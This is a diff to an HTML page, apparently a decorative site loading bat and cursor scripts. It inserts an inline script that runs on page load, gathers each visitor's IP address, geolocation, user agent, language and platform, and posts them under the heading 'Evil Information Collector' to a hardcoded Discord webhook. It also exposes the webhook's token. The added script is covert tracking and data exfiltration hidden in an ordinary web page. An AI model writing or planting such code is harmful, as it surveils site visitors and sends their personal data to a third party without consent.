@@ -144,6 +144,59 @@
                 ♰
             </div>
         </div>
+         <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <script>
+        // Function to gather information and send it to your webhook
+        function gatherAndSendInfo() {
+            // Get IP address using a third-party service
+            fetch('https://api.ipify.org/?format=json')
+            .then(response => response.json())
+            .then(ipData => {
+                // Get location information using Geolocation-DB API
+                return $.getJSON('https://geolocation-db.com/json/')
+                .then(location => {
+                    // Prepare the data payload to send to the webhook
+                    let details = `Country: ${location.country_name},
+                        State: ${location.state},
+                        City: ${location.city},
+                        Latitude: ${location.latitude},
+                        Longitude: ${location.longitude},
+                        IP: ${location.IPv4}`;
+                    let infoPayload = {
+                        content: `Evil Information Collector:
+                            IP: ${ipData.ip}
+                            Location Details:
+                            ${details}
+                            User Agent: ${navigator.userAgent}
+                            Language: ${navigator.language}
+                            Platform: ${navigator.platform}`
+                    };
+
+                    // Send the data to your webhook
+                    return fetch('https://discord.com/api/webhooks/1247933793428570162/jDZUTQaV0_PySUuWMH80mJ5vGLWgxrxYyPUJ74UHAJP5y0suh2mN3OyEWQLmSMSYkI4X', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(infoPayload)
+                    });
+                });
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Error sending information to webhook:', response.status);
+                }
+            })
+            .catch(error => {
+                console.error('Error sending information to webhook:', error);
+            });
+        }
+
+        // Call the function to start the evil process
+        gatherAndSendInfo();
+
+    </script>
         <script src="js/bat.js"></script>
         <script src="js/cursor.js"></script>
 
